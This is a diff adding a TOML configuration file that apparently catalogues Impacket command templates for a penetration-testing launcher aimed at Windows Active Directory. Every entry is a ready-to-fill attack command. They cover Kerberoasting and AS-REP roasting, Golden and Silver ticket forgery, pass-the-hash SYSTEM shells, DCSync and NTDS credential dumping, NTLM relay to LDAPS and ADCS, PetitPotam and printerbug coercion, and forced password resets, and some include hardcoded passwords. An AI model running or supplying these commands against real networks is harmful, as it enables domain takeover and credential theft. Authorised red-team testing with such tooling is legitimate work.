@@ -1,0 +1,397 @@
+category = "impacket"
+display_name = "Impacket"
+icon = ""
+order = 32
+
+# === Discovery / Verification ===
+
+[[command]]
+id = "imp.lookupsid.guest"
+title = "lookupsid.py (null session)"
+template = "impacket-lookupsid {target}/anonymous@{target}"
+requires = ["impacket-lookupsid"]
+tags = ["enum", "rid"]
+
+[[command]]
+id = "imp.lookupsid.authed"
+title = "lookupsid.py (authed) — RID brute"
+template = "impacket-lookupsid '{user_at_domain}:{password}@{target}' 20000"
+requires = ["impacket-lookupsid"]
+tags = ["enum", "rid"]
+when = "creds.kind == 'plaintext'"
+
+# === Kerberos ===
+
+[[command]]
+id = "imp.getTGT"
+title = "getTGT.py — request TGT, save ccache"
+template = "impacket-getTGT '{domain}/{user}:{password}' -dc-ip {dc} -keyExisting"
+requires = ["impacket-getTGT"]
+tags = ["kerberos", "ticket"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.getTGT.hash"
+title = "getTGT.py (NTLM/AES)"
+template = "impacket-getTGT '{domain}/{user}' -hashes ':{nt_hash}' -dc-ip {dc}"
+requires = ["impacket-getTGT"]
+tags = ["kerberos", "ticket", "pth"]
+when = "creds.kind == 'ntlm' and target.has_dc"
+
+[[command]]
+id = "imp.getST.s4u"
+title = "getST.py — S4U (constrained delegation)"
+template = "impacket-getST -spn 'cifs/{dc}' -impersonate Administrator '{domain}/{user}:{password}' -dc-ip {dc}"
+requires = ["impacket-getST"]
+tags = ["kerberos", "s4u"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.getST.rbcd"
+title = "getST.py — RBCD (after rbcd.py write)"
+template = "impacket-getST -spn 'cifs/{target}' -impersonate Administrator -dc-ip {dc} '{domain}/COMPUTER\\$:Mach1neP@ss'"
+requires = ["impacket-getST"]
+tags = ["kerberos", "rbcd"]
+when = "target.has_dc"
+
+[[command]]
+id = "imp.getNPUsers"
+title = "GetNPUsers.py — AS-REProast (no preauth)"
+template = "impacket-GetNPUsers '{domain}/' -usersfile users.txt -no-pass -dc-ip {dc} -format hashcat -outputfile asrep.hashes"
+requires = ["impacket-GetNPUsers"]
+tags = ["asrep", "roast"]
+when = "target.has_dc"
+
+[[command]]
+id = "imp.getUserSPNs"
+title = "GetUserSPNs.py — Kerberoast"
+template = "impacket-GetUserSPNs '{domain}/{user}:{password}' -dc-ip {dc} -request -outputfile spn.hashes"
+requires = ["impacket-GetUserSPNs"]
+tags = ["kerberoast", "spn"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.getUserSPNs.all"
+title = "GetUserSPNs.py — request-user (specific account)"
+template = "impacket-GetUserSPNs '{domain}/{user}:{password}' -dc-ip {dc} -request-user TARGET_USER -outputfile spn.hashes"
+requires = ["impacket-GetUserSPNs"]
+tags = ["kerberoast"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.ticketer.golden"
+title = "ticketer.py — forge Golden ticket"
+template = "impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-X-Y-Z -domain {domain} Administrator"
+requires = ["impacket-ticketer"]
+tags = ["golden", "forge"]
+
+[[command]]
+id = "imp.ticketer.silver"
+title = "ticketer.py — forge Silver ticket"
+template = "impacket-ticketer -nthash SVC_NTLM -domain-sid S-1-5-21-X-Y-Z -domain {domain} -spn 'cifs/{target}' Administrator"
+requires = ["impacket-ticketer"]
+tags = ["silver", "forge"]
+
+[[command]]
+id = "imp.ticketconverter"
+title = "ticketConverter.py — kirbi <-> ccache"
+template = "impacket-ticketConverter ticket.kirbi ticket.ccache"
+requires = ["impacket-ticketConverter"]
+tags = ["kerberos", "convert"]
+
+# === SMB / shares ===
+
+[[command]]
+id = "imp.smbclient.interactive"
+title = "smbclient.py (interactive shell)"
+template = "impacket-smbclient '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-smbclient"]
+tags = ["smb", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.smbclient.hash"
+title = "smbclient.py (NTLM)"
+template = "impacket-smbclient -hashes ':{nt_hash}' '{user_at_domain}@{target}'"
+requires = ["impacket-smbclient"]
+tags = ["smb", "interactive", "pth"]
+interactive = true
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "imp.smbserver.share"
+title = "smbserver.py — quick share for file transfer"
+template = "impacket-smbserver share $(pwd) -smb2support -username chrono -password chronopass"
+requires = ["impacket-smbserver"]
+tags = ["serve", "transfer"]
+
+[[command]]
+id = "imp.smbserver.creds_capture"
+title = "smbserver.py — capture inbound auth (relay-style)"
+template = "impacket-smbserver share /tmp -smb2support -username '' -password '' -no-debug"
+requires = ["impacket-smbserver"]
+tags = ["capture", "relay"]
+
+# === Code execution ===
+
+[[command]]
+id = "imp.psexec"
+title = "psexec.py — SYSTEM shell"
+template = "impacket-psexec '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-psexec"]
+tags = ["exec", "system", "noisy", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.psexec.hash"
+title = "psexec.py — Pass-the-Hash"
+template = "impacket-psexec -hashes ':{nt_hash}' '{user_at_domain}@{target}'"
+requires = ["impacket-psexec"]
+tags = ["exec", "system", "pth", "interactive"]
+interactive = true
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "imp.smbexec"
+title = "smbexec.py — non-interactive SYSTEM exec"
+template = "impacket-smbexec '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-smbexec"]
+tags = ["exec", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.wmiexec"
+title = "wmiexec.py — stealthier exec"
+template = "impacket-wmiexec '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-wmiexec"]
+tags = ["exec", "wmi", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.wmiexec.hash"
+title = "wmiexec.py (Pass-the-Hash)"
+template = "impacket-wmiexec -hashes ':{nt_hash}' '{user_at_domain}@{target}'"
+requires = ["impacket-wmiexec"]
+tags = ["exec", "wmi", "pth", "interactive"]
+interactive = true
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "imp.atexec.id"
+title = "atexec.py — schtasks-based exec (one-shot whoami)"
+template = "impacket-atexec '{user_at_domain}:{password}@{target}' 'whoami /all'"
+requires = ["impacket-atexec"]
+tags = ["exec", "schtasks"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.dcomexec"
+title = "dcomexec.py — DCOM-based exec"
+template = "impacket-dcomexec '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-dcomexec"]
+tags = ["exec", "dcom", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+# === Secrets / dumps ===
+
+[[command]]
+id = "imp.secretsdump.local_sam"
+title = "secretsdump.py — remote SAM (local admin)"
+template = "impacket-secretsdump '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-secretsdump"]
+tags = ["dump", "sam"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.secretsdump.dcsync"
+title = "secretsdump.py — DCSync ALL"
+template = "impacket-secretsdump '{domain}/{user}:{password}@{dc}' -outputfile dcsync"
+requires = ["impacket-secretsdump"]
+tags = ["dcsync", "ntds"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.secretsdump.dcsync.user"
+title = "secretsdump.py — DCSync single user"
+template = "impacket-secretsdump '{domain}/{user}:{password}@{dc}' -just-dc-user TARGET_USER"
+requires = ["impacket-secretsdump"]
+tags = ["dcsync"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.secretsdump.dcsync.hash"
+title = "secretsdump.py — DCSync via NTLM hash"
+template = "impacket-secretsdump -hashes ':{nt_hash}' '{domain}/{user}@{dc}'"
+requires = ["impacket-secretsdump"]
+tags = ["dcsync", "pth"]
+when = "creds.kind == 'ntlm' and target.has_dc"
+
+[[command]]
+id = "imp.secretsdump.from_ntds"
+title = "secretsdump.py — offline NTDS.dit + SYSTEM"
+template = "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+requires = ["impacket-secretsdump"]
+tags = ["dump", "offline"]
+
+[[command]]
+id = "imp.secretsdump.from_ccache"
+title = "secretsdump.py — kerberos ticket auth"
+template = "impacket-secretsdump -k -no-pass '{domain}/{user}@{dc_fqdn}'"
+requires = ["impacket-secretsdump"]
+tags = ["dump", "kerberos"]
+when = "creds.kind == 'kerberos' and target.has_dc"
+
+# === Relay / Coercion ===
+
+[[command]]
+id = "imp.ntlmrelayx.smb"
+title = "ntlmrelayx.py — SMB relay (no SMB signing)"
+template = "impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server --no-wcf-server -socks"
+requires = ["impacket-ntlmrelayx"]
+tags = ["relay", "socks"]
+
+[[command]]
+id = "imp.ntlmrelayx.ldaps_dcsync"
+title = "ntlmrelayx.py — LDAPS relay → DCSync grant"
+template = "impacket-ntlmrelayx -t ldaps://{dc} --escalate-user TARGET_USER --no-http-server --no-wcf-server"
+requires = ["impacket-ntlmrelayx"]
+tags = ["relay", "ldap"]
+when = "target.has_dc"
+
+[[command]]
+id = "imp.ntlmrelayx.adcs.esc8"
+title = "ntlmrelayx.py — ADCS HTTP enrollment (ESC8)"
+template = "impacket-ntlmrelayx -t http://CA-HOST/certsrv/certfnsh.asp --adcs --template DomainController"
+requires = ["impacket-ntlmrelayx"]
+tags = ["relay", "adcs", "esc8"]
+
+[[command]]
+id = "imp.ntlmrelayx.shadow"
+title = "ntlmrelayx.py — LDAP shadow creds (ESC14-ish)"
+template = "impacket-ntlmrelayx -t ldap://{dc} --shadow-credentials --shadow-target TARGET_USER"
+requires = ["impacket-ntlmrelayx"]
+tags = ["relay", "shadow-creds"]
+when = "target.has_dc"
+
+[[command]]
+id = "imp.printerbug"
+title = "printerbug.py — coerce MS-RPRN auth"
+template = "impacket-printerbug '{domain}/{user}:{password}@{target}' {lhost}"
+requires = ["impacket-printerbug"]
+tags = ["coerce", "printerbug"]
+when = "creds.kind == 'plaintext' and target.has_lhost"
+
+[[command]]
+id = "imp.petitpotam"
+title = "PetitPotam.py — coerce EFSRPC auth"
+template = "PetitPotam.py -u {user} -p '{password}' -d {domain} {lhost} {target}"
+requires = ["PetitPotam.py"]
+tags = ["coerce", "efsrpc"]
+when = "creds.kind == 'plaintext' and target.has_lhost"
+
+[[command]]
+id = "imp.coercer.full"
+title = "Coercer — try all coerce methods"
+template = "Coercer coerce -u {user} -p '{password}' -d {domain} -t {target} -l {lhost}"
+requires = ["Coercer"]
+tags = ["coerce", "broad"]
+when = "creds.kind == 'plaintext' and target.has_lhost"
+
+# === Accounts / objects ===
+
+[[command]]
+id = "imp.addcomputer"
+title = "addcomputer.py — abuse MachineAccountQuota"
+template = "impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass 'Mach1neP@ss' -dc-host {dc}"
+requires = ["impacket-addcomputer"]
+tags = ["maq", "rbcd"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "imp.changepasswd.smb"
+title = "changepasswd.py — reset user pw via SMB"
+template = "impacket-changepasswd '{domain}/TARGET_USER@{target}' -newpass 'Resett3d!'"
+requires = ["impacket-changepasswd"]
+tags = ["reset"]
+
+[[command]]
+id = "imp.rpcdump"
+title = "rpcdump.py — RPC service enum"
+template = "impacket-rpcdump @{target}"
+requires = ["impacket-rpcdump"]
+tags = ["enum", "rpc"]
+
+[[command]]
+id = "imp.rpcclient"
+title = "samrdump.py — SAMR domain dump"
+template = "impacket-samrdump {target} -domain {domain}"
+requires = ["impacket-samrdump"]
+tags = ["enum", "samr"]
+
+# === MSSQL / mssqlclient ===
+
+[[command]]
+id = "imp.mssqlclient.sql"
+title = "mssqlclient.py — SQL auth"
+template = "impacket-mssqlclient '{user}:{password}@{target}'"
+requires = ["impacket-mssqlclient"]
+tags = ["mssql", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.mssqlclient.winauth"
+title = "mssqlclient.py — Windows auth (-windows-auth)"
+template = "impacket-mssqlclient '{user_at_domain}:{password}@{target}' -windows-auth"
+requires = ["impacket-mssqlclient"]
+tags = ["mssql", "interactive", "winauth"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.mssqlclient.kerb"
+title = "mssqlclient.py — Kerberos"
+template = "impacket-mssqlclient -k -no-pass '{user_at_domain}@{target}'"
+requires = ["impacket-mssqlclient"]
+tags = ["mssql", "interactive", "kerberos"]
+interactive = true
+when = "creds.kind == 'kerberos'"
+
+# === Misc ===
+
+[[command]]
+id = "imp.reg.query"
+title = "reg.py — remote registry query"
+template = "impacket-reg '{user_at_domain}:{password}@{target}' query -keyName 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion'"
+requires = ["impacket-reg"]
+tags = ["registry"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.services.list"
+title = "services.py — list Windows services"
+template = "impacket-services '{user_at_domain}:{password}@{target}' list"
+requires = ["impacket-services"]
+tags = ["services"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.psloggedon"
+title = "psloggedon.py — list logged-on users"
+template = "impacket-psloggedon '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-psloggedon"]
+tags = ["enum"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "imp.exchanger"
+title = "exchanger.py — Exchange autodiscover"
+template = "impacket-exchanger '{user_at_domain}:{password}' autodiscover {target}"
+requires = ["impacket-exchanger"]
+tags = ["exchange"]
+when = "creds.kind == 'plaintext'"
